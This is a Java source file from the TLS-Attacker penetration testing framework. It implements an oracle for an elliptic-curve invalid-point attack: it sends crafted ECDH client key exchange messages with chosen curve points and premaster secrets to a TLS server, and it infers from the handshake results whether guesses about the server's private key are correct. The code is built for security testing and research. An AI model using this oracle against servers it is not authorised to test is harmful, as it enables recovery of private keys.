/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.ec.oracles;

import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.modifiablevariable.biginteger.BigIntegerModificationFactory;
import de.rub.nds.modifiablevariable.biginteger.ModifiableBigInteger;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.crypto.ec.Curve;
import de.rub.nds.tlsattacker.core.crypto.ec.DivisionException;
import de.rub.nds.tlsattacker.core.crypto.ec.ECComputer;
import de.rub.nds.tlsattacker.core.crypto.ec.Point;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.ArbitraryMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.HandshakeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import java.math.BigInteger;
import java.util.Arrays;
import java.util.List;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;
import org.bouncycastle.util.BigIntegers;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 */
public class RealDirectMessageECOracle extends ECOracle {

    private final Config config;

    private Point checkPoint;

    private byte[] checkPMS;

    private final ECComputer computer;

    public RealDirectMessageECOracle(Config config, Curve curve) {
        this.config = config;
        this.curve = curve;
        this.computer = new ECComputer();
        this.computer.setCurve(curve);

        executeValidWorkflowAndExtractCheckValues();

        LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
        Configuration ctxConfig = ctx.getConfiguration();
        LoggerConfig loggerConfig = ctxConfig.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
        loggerConfig.setLevel(Level.INFO);
        ctx.updateLoggers();
    }

    @Override
    public boolean checkSecretCorrectnes(Point ecPoint, BigInteger secret) {
        TlsContext tlsContext = new TlsContext(config);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(config.getExecutorType(),
                tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();
        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE);

        // modify public point base X coordinate
        ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        x.setModification(BigIntegerModificationFactory.explicitValue(ecPoint.getX()));
        message.setPublicKeyBaseX(x);

        // modify public point base Y coordinate
        ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        y.setModification(BigIntegerModificationFactory.explicitValue(ecPoint.getY()));
        message.setPublicKeyBaseY(y);

        // set explicit premaster secret value (X value of the resulting point
        // coordinate)
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitePMS = BigIntegers.asUnsignedByteArray(curve.getKeyBits() / 8, secret);
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
        message.getComputations().setPremasterSecret(pms);

        if (numberOfQueries % 100 == 0) {
            LOGGER.info("Number of queries so far: {}", numberOfQueries);
        }

        boolean valid = true;
        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException e) {
            valid = false;
            e.printStackTrace();
        } finally {
            numberOfQueries++;
        }

        if (!tlsContext.getWorkflowTrace().configuredLooksLikeActual()) {
            valid = false;
        }

        return valid;
    }

    @Override
    public boolean isFinalSolutionCorrect(BigInteger guessedSecret) {
        // BigInteger correct = new
        // BigInteger("25091756309879652045519159642875354611257005804552159157");
        // if (correct.compareTo(guessedSecret) == 0) {
        // return true;
        // } else {
        // return false;
        // }

        computer.setSecret(guessedSecret);
        try {
            Point p = computer.mul(checkPoint);
            byte[] pms = BigIntegers.asUnsignedByteArray(curve.getKeyBits() / 8, p.getX());
            return Arrays.equals(checkPMS, pms);
        } catch (DivisionException ex) {
            LOGGER.debug(ex);
            return false;
        }
    }

    /**
     * Executes a valid workflow with valid points etc. and saves the values for
     * further validation purposes.
     */
    private void executeValidWorkflowAndExtractCheckValues() {
        TlsContext tlsContext = new TlsContext(config);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(config.getExecutorType(),
                tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();

        workflowExecutor.executeWorkflow();

        List<HandshakeMessage> clientKeyExchangeList = trace
                .getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE);
        if (clientKeyExchangeList.isEmpty()) {
            // TODO
            throw new WorkflowExecutionException("Could not retrieve ECDH PublicKey");
        } else {
            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
                    .getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE).get(0);

            // get public point base X and Y coordinates
            BigInteger x = message.getPublicKeyBaseX().getValue();
            BigInteger y = message.getPublicKeyBaseY().getValue();
            checkPoint = new Point(x, y);
            checkPMS = message.getComputations().getPremasterSecret().getValue();
        }
    }
}
